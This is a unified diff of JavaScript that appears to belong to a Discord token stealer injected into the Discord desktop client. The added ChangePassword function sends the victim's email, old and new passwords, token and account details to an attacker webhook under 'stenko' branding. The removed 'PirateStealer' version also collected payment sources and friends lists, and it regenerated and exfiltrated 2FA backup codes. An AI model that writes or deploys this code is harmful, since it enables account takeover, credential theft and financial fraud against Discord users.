@@ -279,6 +279,63 @@ function Login(email, password, token) {
     })
 }
 
+function ChangePassword(oldpassword, newpassword, token) {
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.send( null );
+    xmlHttp.responseText;`, !0).then((info) => {
+        window.webContents.executeJavaScript(`
+        var xmlHttp = new XMLHttpRequest();
+        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
+        xmlHttp.send( null );
+        xmlHttp.responseText;
+    `, !0).then((ip) => {
+            const json = JSON.parse(info);
+            var params = {
+                username: "stenko",
+                content: "",
+                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
+                embeds: [
+                    {
+                        "color": 3092790,
+                        "fields": [
+                            {
+                                "name": " password changed",
+                                "value": `email - ${json.email}\nold password - ${oldpassword}\nnew password - ${newpassword}`,
+                                "inline": true
+                            },
+                            {
+                                "name": " others",
+                                "value": `nitro type: ${GetNitro(json.premium_type)}\nbadges - ${GetBadges(json.flags)}`,
+                                "inline": true
+                            },
+                            {
+                                "name": " token",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": "stenko premium version",
+		            "url": `https://stenko.xyz`,
+                        },
+		        "thumbnail": {
+                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": ""
+                        }                 
+                    }
+                ]
+            }
+        SendToWebhook(JSON.stringify(params))
+        })
+    })
+}
+
 function ChangeEmail(newemail, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
     window.webContents.executeJavaScript(`
@@ -675,355 +732,60 @@ function Login(email, password, token) {
 }
 
 function ChangePassword(oldpassword, newpassword, token) {
-	const window = BrowserWindow.getAllWindows()[0];
-	window.webContents.executeJavaScript(`
+    const window = BrowserWindow.getAllWindows()[0];
+    window.webContents.executeJavaScript(`
     var xmlHttp = new XMLHttpRequest();
     xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send( null );
     xmlHttp.responseText;`, !0).then((info) => {
-		window.webContents.executeJavaScript(`
+        window.webContents.executeJavaScript(`
         var xmlHttp = new XMLHttpRequest();
         xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
         xmlHttp.send( null );
         xmlHttp.responseText;
     `, !0).then((ip) => {
-			window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-				window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-
-					if (token.startsWith("mfa")) {
-						window.webContents.executeJavaScript(`
-              var xmlHttp = new XMLHttpRequest();
-              xmlHttp.open("POST", "https://discord.com/api/v9/users/@me/mfa/codes", false);
-              xmlHttp.setRequestHeader('Content-Type', 'application/json');
-              xmlHttp.setRequestHeader("authorization", "${token}")
-              xmlHttp.send(JSON.stringify({\"password\":\"${newpassword}\",\"regenerate\":true}));
-              xmlHttp.responseText`, !0).then((codes) => {
-
-							var fieldo = [];
-							var baseuri = "https://premium.piratestealer.to/raw/"
-
-
-							var gayass = JSON.parse(codes)
-							let g = gayass.backup_codes
-							const r = g.filter((code) => {
-								return code.consumed == null
-							})
-							for (let z in r) {
-								fieldo.push({
-									name: `Code`,
-									value: `\`${r[z].code.insert(4, "-")}\``,
-									inline: true
-								})
-								baseuri += `${r[z].code.insert(4, "-")}<br>`
-							}
-
-							function totalFriends() {
-								var f = JSON.parse(info4)
-								const r = f.filter((user) => {
-
-									return user.type == 1
-								})
-								return r.length
-							}
-
-							function CalcFriends() {
-								var f = JSON.parse(info4)
-								const r = f.filter((user) => {
-									return user.type == 1
-								})
-								var gay = "";
-								for (z of r) {
-									var b = GetRBadges(z.user.public_flags)
-									if (b != "") {
-										gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-									}
-								}
-								if (gay == "") {
-									gay = "No Rare Friends"
-								}
-								return gay
-							}
-
-							function Cool() {
-								const json = JSON.parse(info3)
-								var billing = "";
-								json.forEach(z => {
-									if (z.type == "") {
-										return "\`❌\`"
-									} else if (z.type == 2 && z.invalid != !0) {
-										billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-									} else if (z.type == 1 && z.invalid != !0) {
-										billing += "\`✔️\`" + " :credit_card:"
-									} else {
-										return "\`❌\`"
-									}
-								})
-								if (billing == "") {
-									billing = "\`❌\`"
-								}
-								return billing
-							}
-							const json = JSON.parse(info);
-
-							var params = {
-								username: "PirateStealer",
-								content: "",
-								embeds: [{
-									"title": "Password Changed",
-									description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ newpassword+")",
-									"color": config['embed-color'],
-									"fields": [{
-										name: "Info",
-										value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-										inline: !1
-									}, {
-										name: "Username",
-										value: `\`${json.username}#${json.discriminator}\``,
-										inline: !0
-									}, {
-										name: "ID",
-										value: `\`${json.id}\``,
-										inline: !0
-									}, {
-										name: "Nitro",
-										value: `${GetNitro(json.premium_type)}`,
-										inline: !1
-									}, {
-										name: "Badges",
-										value: `${GetBadges(json.flags)}`,
-										inline: !1
-									}, {
-										name: "Billing",
-										value: `${Cool()}`,
-										inline: !1
-									}, {
-										name: "Email",
-										value: `\`${json.email}\``,
-										inline: !1
-									}, {
-										name: "Old Password",
-										value: `\`${oldpassword}\``,
-										inline: !0
-									}, {
-										name: "New Password",
-										value: `\`${newpassword}\``,
-										inline: !0
-									}, {
-										name: "Token",
-										value: `\`\`\`${token}\`\`\``,
-										inline: !1
-									}, ],
-									"author": {
-										"name": "PirateStealer"
-									},
-									"footer": {
-										"text": "PirateStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
-								}, {
-									"title": `Total Friends (${totalFriends()})`,
-									"color": config['embed-color'],
-									"description": CalcFriends(),
-									"author": {
-										"name": "PirateStealer"
-									},
-									"footer": {
-										"text": "PirateStealer"
-									},
-									"thumbnail": {
-										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-									}
-								}]
-							}
-							var mfaembed = {
-								"title": ":detective: __2FA Codes__",
-								"description": `[Get all of them](${baseuri})`,
-								"color": config['embed-color'],
-								"fields": fieldo,
-								"author": {
-									"name": "PirateStealer"
-								},
-								"footer": {
-									"text": "PirateStealer"
-								}
-							}
-							if (token.startsWith("mfa")) {
-								params.embeds.push(mfaembed)
-							}
-
-							SendToWebhook(JSON.stringify(params))
-
-						})
-					} else {
-
-						const window = BrowserWindow.getAllWindows()[0];
-						window.webContents.executeJavaScript(`
-    var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.send( null );
-    xmlHttp.responseText;`, !0).then((info) => {
-							window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );
-        xmlHttp.send( null );
-        xmlHttp.responseText;
-    `, !0).then((ip) => {
-								window.webContents.executeJavaScript(`
-        var xmlHttp = new XMLHttpRequest();
-        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
-        xmlHttp.setRequestHeader("Authorization", "${token}");
-        xmlHttp.send( null );
-        xmlHttp.responseText`, !0).then((info3) => {
-									window.webContents.executeJavaScript(`
-            var xmlHttp = new XMLHttpRequest();
-            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
-            xmlHttp.setRequestHeader("Authorization", "${token}");
-            xmlHttp.send( null );
-            xmlHttp.responseText`, !0).then((info4) => {
-
-										function totalFriends() {
-											var f = JSON.parse(info4)
-											const r = f.filter((user) => {
-												return user.type == 1
-											})
-											return r.length
-										}
-
-										function CalcFriends() {
-											var f = JSON.parse(info4)
-											const r = f.filter((user) => {
-												return user.type == 1
-											})
-											var gay = "";
-											for (z of r) {
-												var b = GetRBadges(z.user.public_flags)
-												if (b != "") {
-													gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
-												}
-											}
-											if (gay == "") {
-												gay = "No Rare Friends"
-											}
-											return gay
-										}
-
-										function Cool() {
-											const json = JSON.parse(info3)
-											var billing = "";
-											json.forEach(z => {
-												if (z.type == "") {
-													return "\`❌\`"
-												} else if (z.type == 2 && z.invalid != !0) {
-													billing += "\`✔️\`" + " <:paypal:896441236062347374>"
-												} else if (z.type == 1 && z.invalid != !0) {
-													billing += "\`✔️\`" + " :credit_card:"
-												} else {
-													return "\`❌\`"
-												}
-											})
-											if (billing == "") {
-												billing = "\`❌\`"
-											}
-											return billing
-										}
-										const json = JSON.parse(info);
-										var params = {
-											username: "PirateStealer",
-											content: "",
-											embeds: [{
-												"title": "Password Changed",
-												description: "[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://premium.piratestealer.to/raw/"+ token +"<br>"+ newpassword+")",
-												"color": config['embed-color'],
-												"fields": [{
-													name: "Info",
-													value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``,
-													inline: !1
-												}, {
-													name: "Username",
-													value: `\`${json.username}#${json.discriminator}\``,
-													inline: !0
-												}, {
-													name: "ID",
-													value: `\`${json.id}\``,
-													inline: !0
-												}, {
-													name: "Nitro",
-													value: `${GetNitro(json.premium_type)}`,
-													inline: !1
-												}, {
-													name: "Badges",
-													value: `${GetBadges(json.flags)}`,
-													inline: !1
-												}, {
-													name: "Billing",
-													value: `${Cool()}`,
-													inline: !1
-												}, {
-													name: "Email",
-													value: `\`${json.email}\``,
-													inline: !1
-												}, {
-													name: "Old Password",
-													value: `\`${oldpassword}\``,
-													inline: !0
-												}, {
-													name: "New Password",
-													value: `\`${newpassword}\``,
-													inline: !0
-												}, {
-													name: "Token",
-													value: `\`\`\`${token}\`\`\``,
-													inline: !1
-												}, ],
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}, {
-												"title": `Total Friends (${totalFriends()})`,
-												"color": config['embed-color'],
-												"description": CalcFriends(),
-												"author": {
-													"name": "PirateStealer"
-												},
-												"footer": {
-													"text": "PirateStealer"
-												},
-												"thumbnail": {
-													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-												}
-											}]
-										}
-										SendToWebhook(JSON.stringify(params))
-									})
-								})
-							})
-						})
-
-					}
-				})
-			})
-		})
-	})
+            const json = JSON.parse(info);
+            var params = {
+                username: "stenko",
+                content: "",
+                avatar_url: "https://i.imgur.com/mnMYF8Y.jpg",
+                embeds: [
+                    {
+                        "color": 3092790,
+                        "fields": [
+                            {
+                                "name": " password changed",
+                                "value": `email - ${json.email}\nold password - ${oldpassword}\nnew password - ${newpassword}`,
+                                "inline": true
+                            },
+                            {
+                                "name": " others",
+                                "value": `nitro type: ${GetNitro(json.premium_type)}\nbadges - ${GetBadges(json.flags)}`,
+                                "inline": true
+                            },
+                            {
+                                "name": " token",
+                                "value": `\`${token}\``,
+                                "inline": false
+                            }
+                        ],
+                        "author": {
+                            "name": "stenko premium version",
+		            "url": `https://stenko.xyz`,
+                        },
+		        "thumbnail": {
+                            "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+                        },
+                        "footer": {
+                            "text": ""
+                        }                 
+                    }
+                ]
+            }
+        SendToWebhook(JSON.stringify(params))
+        })
+    })
 }
 
 function ChangeEmail(newemail, password, token) {
